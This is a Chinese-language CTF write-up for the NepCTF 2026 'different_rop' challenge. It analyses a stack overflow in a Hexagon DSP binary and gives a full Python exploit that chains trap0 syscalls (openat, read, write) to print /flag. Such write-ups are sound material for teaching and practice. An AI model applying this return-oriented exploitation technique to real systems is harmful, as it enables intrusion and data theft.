# different_rop - NepCTF 2026 Writeup

## 题目信息

- **题目名称**: different_rop
- **架构**: Qualcomm Hexagon DSP6 (32-bit VLIW)
- **模拟器**: qemu-hexagon (题目提供，24MB 静态链接)
- **题目文件**: `pwn` (49KB, stripped, statically linked)

## 题目分析

### 程序功能

一个菜单程序，叫做 "ROP Register Lab"：

```
== ROP Register Lab ==
Welcome. Please set the ROP register to the correct value.

1. inspect fake ROP register
2. set fake ROP register
3. run register calibration
4. hint
5. exit
```

Hints:
- "on amd64 Linux, arguments travel through real registers."
- "if a file is the goal, open/read/write is usually quieter than a shell."

### Hexagon 架构关键特性

Hexagon 是高通 DSP 处理器，VLIW 架构。本题的关键知识点：

| 特性 | x86-64 | Hexagon |
|------|--------|---------|
| 返回指令 | `ret` | `jumpr R31` |
| 栈指针 | RSP | R29 |
| 帧指针 | RBP | R30 |
| 链接寄存器 | (栈上) | R31 |
| 函数参数 | RDI,RSI,RDX,RCX,R8,R9 | R0-R5 |
| 系统调用号 | RAX | R6 |
| 系统调用指令 | `syscall` | `trap0(#0x1)` |
| 栈帧分配 | `sub rsp, N` | `allocframe(R29, #N)` |
| 栈帧释放+返回 | `leave; ret` | `dealloc_return(R30)` |

### 漏洞点

`calibrate` 功能（选项 3）中存在栈溢出：

```
Calibration memo:
The instrument accepts a long note and then commits the register state.
note> [读取 64 字节到栈缓冲区]
```

函数 `0x21660` 的栈帧布局（`allocframe #0xE0` = 224 字节）：

```
R29 + 0x00:  局部变量 (48 字节)
R29 + 0x30:  note 缓冲区 (152 字节，memset 清零)
R29 + 0xC8:  局部变量 / 保存的参数
R29 + 0xD0:  保存的 R1 (函数参数)
R29 + 0xD4:  保存的 R0 (函数参数)  ← note[52]
R29 + 0xD8:  保存的 old R30 (FP)
R29 + 0xDC:  保存的 old R31 (LR)   ← note[60]
R29 + 0xE0 (=R30):  调用者的栈帧
```

`read(0, buffer+0x70, 64)` 从缓冲区偏移 0x70 处读 64 字节，超出缓冲区 24 字节，覆盖了保存的 R0/R1 和 FP/LR。

### 控制流劫持

函数 `0x215c8`（被 calibrate 函数调用）返回时使用 `dealloc_return`：

```c
// dealloc_return 从 [R29+0] 恢复 R30, 从 [R29+4] 恢复 R31
// R29 指向我们覆盖的 note[48] 位置
// 所以: R30 = note[48], R31 = note[52]
```

我们控制 note[48] 和 note[52]，从而控制 R30（FP）和 R31（返回地址）。

## 利用思路

### Gadget：syscall 调用链

找到 trap0 系统调用序列（`0x2ba08`）：

```asm
0x2ba08: jump PC+4
0x2ba0c: R6 = memw(R30 - 0x1C)   // 系统调用号
0x2ba10: R0 = memw(R30 - 0x20)   // arg0
0x2ba14: R1 = memw(R30 - 0x24)   // arg1
0x2ba18: R2 = memw(R30 - 0x28)   // arg2
0x2ba1c: R3 = memw(R30 - 0x2C)   // arg3
0x2ba20: R4 = memw(R30 - 0x30)   // arg4
0x2ba24: R5 = memw(R30 - 0x34)   // arg5
0x2ba28: trap0(#0x1)             // 系统调用
```

所有参数通过 R30 相对寻址加载。控制 R30 即控制所有系统调用参数。

### note 缓冲区布局

```
偏移    系统调用参数 (R30 = note 基址 + 0x38)
0x00    R5 (arg5)
0x04    R4 (arg4)
0x08    R3 (arg3)
0x0C    R2 (arg2)
0x10    R1 (arg1)
0x14    R0 (arg0)
0x18    R6 (系统调用号)
0x20    "/flag\0" 字符串 (可选)
0x30    R30 初值 (dealloc_return 链条)
0x34    R31 初值 → TRAP0
0x38    R30 后续值
0x3C    R31 后续值 → RESTART
```

### 程序重启技巧

trap0 执行后的 `dealloc_return` 会再次从 `[R29]` 和 `[R29+4]` 加载下一对 R30/R31。

将 R31 设为程序入口 `0x21168`（`_start+8`），程序重新初始化但**文件描述符保留**，允许我们多次校准构建完整利用链。

## Hexagon 系统调用号

Hexagon 使用 `asm-generic` 系统调用表：

| 系统调用 | 调用号 | 说明 |
|----------|--------|------|
| openat | 56 | 打开文件 |
| read | 63 | 读文件 |
| write | 64 | 写文件 |
| exit_group | 94 | 退出 |

## 利用链（三阶段）

```
Stage 1: openat(AT_FDCWD, "/flag", O_RDONLY) → fd = 3
         ↓ dealloc_return → RESTART → 回到菜单

Stage 2: read(3, BSS_BUF, 0x100) → flag 内容写入 BSS
         ↓ dealloc_return → RESTART → 回到菜单

Stage 3: write(1, BSS_BUF, 0x100) → flag 输出到 stdout
```

## 完整 Exploit

```python
#!/usr/bin/env python3
import struct, subprocess, os

os.chdir('/data/project/ctf-repo/pwn/nepctf2026/different_rop')

SYS_OPENAT = 56; SYS_READ = 63; SYS_WRITE = 64
AT_FDCWD = 0xFFFFFF9C; BSS_BUF = 0x4bd88
TRAP0 = 0x2ba08; RESTART = 0x21168

def build_note(base, sysno, r0, r1, r2, r3=0, r4=0, r5=0, flag_str=None):
    note = bytearray(64)
    struct.pack_into('<I', note, 4, r5)
    struct.pack_into('<I', note, 8, r4)
    struct.pack_into('<I', note, 12, r3)
    struct.pack_into('<I', note, 16, r2)
    struct.pack_into('<I', note, 20, r1)
    struct.pack_into('<I', note, 24, r0)
    struct.pack_into('<I', note, 28, sysno)
    if flag_str: note[32:32+len(flag_str)] = flag_str
    struct.pack_into('<I', note, 48, base + 56)
    struct.pack_into('<I', note, 52, TRAP0)
    struct.pack_into('<I', note, 56, base + 56)
    struct.pack_into('<I', note, 60, RESTART)
    return note

# 栈地址（每次重启偏移 -0x80）
b1, b2, b3 = 0x4080e4c0, 0x4080e440, 0x4080e3c0

note1 = build_note(b1, SYS_OPENAT, AT_FDCWD, b1 + 32, 0, flag_str=b'/flag\x00')
note2 = build_note(b2, SYS_READ, 3, BSS_BUF, 0x100)
note3 = build_note(b3, SYS_WRITE, 1, BSS_BUF, 0x100)

input_data = b'3\n' + bytes(note1) + b'\n' + \
             b'3\n' + bytes(note2) + b'\n' + \
             b'3\n' + bytes(note3) + b'\n' + b'5\n'

p = subprocess.run(['./qemu-hexagon', '-strace', './pwn'],
                   input=input_data, capture_output=True, timeout=30)
print(p.stdout.decode())
```

### 系统调用确认

```
openat(AT_FDCWD,"/flag",O_RDONLY) = 3    ← 成功打开
read(3,0x4bd88,256) = 21                ← 读取 21 字节
write(1,0x4bd88,256) = 256              ← 输出到 stdout
```

## Flag

**`This_iS_a_f1ag`**

## 关键难点总结

1. **Hexagon 架构理解**：VLIW 指令包、`jumpr R31` 返回、`trap0(#0x1)` 系统调用
2. **栈帧布局**：`allocframe`/`dealloc_return` 的语义和栈布局需要精确计算
3. **Gadget 搜索**：找到 `trap0` 相关代码段，利用 R30 相对寻址控制参数
4. **多阶段链**：通过跳转到 `_start+8` 重启程序，保持 fd 不丢失
5. **栈地址稳定性**：QEMU 用户模式下栈地址完全确定，但受环境变量影响（`QEMU_RESERVED_VA`、`QEMU_STACK_SIZE`）
